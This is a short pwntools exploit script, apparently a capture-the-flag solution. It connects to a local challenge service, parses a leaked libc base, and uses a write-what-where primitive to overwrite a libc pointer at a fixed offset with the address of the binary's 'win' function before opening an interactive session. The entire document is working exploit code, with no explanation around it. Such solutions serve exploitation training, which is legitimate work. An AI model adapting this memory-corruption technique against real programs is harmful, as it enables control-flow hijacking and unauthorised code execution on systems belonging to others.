from pwn import *
context.arch = "amd64"
p=remote("localhost", 1337)
#p = process("./main_patched")
elf = ELF("./main", checksec=False)
libc = ELF( "./libc.so.6")


def where(w): p.sendlineafter("where ? ", w)
def what(w): p.sendlineafter("what ? ", w)


p.recvuntil(b"Libc range: ")
libc.address = int(p.recv(14).strip(), 16)
log.info(f"Libc base: {hex(libc.address)}")

print(hex(libc.address + 0x21a098))

where(str(hex(libc.address + 0x21a098)))
what(str(hex(elf.sym.win)))

p.sendline(b"n")

#gdb.attach(p, gdb_args=["-q"], terminal=["alacritty", "-e"])
p.interactive()
